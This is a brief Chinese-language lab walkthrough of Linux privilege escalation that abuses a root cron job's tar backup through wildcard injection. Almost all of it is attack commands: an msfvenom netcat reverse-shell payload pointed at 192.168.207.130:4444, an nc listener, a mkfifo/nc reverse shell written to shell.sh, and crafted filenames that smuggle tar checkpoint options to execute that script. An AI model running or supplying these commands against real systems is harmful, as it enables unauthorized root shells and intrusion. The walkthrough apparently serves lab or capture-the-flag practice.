cron 作业以 root 身份运行。每分钟读取/etc/cron.daily/backup 脚本中编写的程序，将每个用户的主目录的使用tar压缩副本保存到 /etc/backups。

cat /etc/cron.daily/backup

2.使用tar通配符注入

2.1 kali生成nc反弹连接

msfvenom -p cmd/unix/reverse_netcat lhost=192.168.207.130 lport=4444 R

nc -nlvp 4444

2.3 靶机执行命令

echo "mkfifo /tmp/xprbgtk; nc 192.168.207.130 4444 0</tmp/xprbgtk | /bin/sh >/tmp/xprbgtk 2>&1; rm /tmp/xprbgtk" > shell.sh 
echo "" > "-- checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
